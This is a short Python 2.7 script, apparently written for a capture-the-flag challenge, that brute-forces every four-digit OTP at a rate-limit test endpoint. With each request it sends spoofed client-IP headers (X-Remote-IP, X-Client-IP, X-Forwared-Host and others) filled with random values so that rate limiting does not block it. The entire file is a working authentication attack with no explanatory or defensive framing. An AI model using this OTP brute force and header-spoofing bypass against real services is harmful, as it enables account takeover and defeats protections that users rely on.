#!/usr/bin/python2.7
import os
import sys
import requests
import string
import random
def lund():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(5))

def ip():
    a= ''.join(random.choice(string.digits) for _ in range(3))
    return a + "0.0.1"


r = requests.Session()
for i in range(10):
    for j in range(10):
        for k in range(10):
            for l in range(10):
                r=requests.get("http://ratelimit.noobarmy.org/enterotp?digit_1="+str(i)+"&digit_2="+str(j)+"&digit_3="+str(k)+"&digit_4="+str(l),headers={"Range":"0-1024","Etag":str(lund() + "%00"), "X-Remote-IP": str(ip()) ,"X-Remote-Addr": str(ip()) ,"X-Client-IP": str(ip()) ,"X-Host": str(ip()) ,"X-Forwared-Host": str(ip())})
                print(r.text)
                print(r)
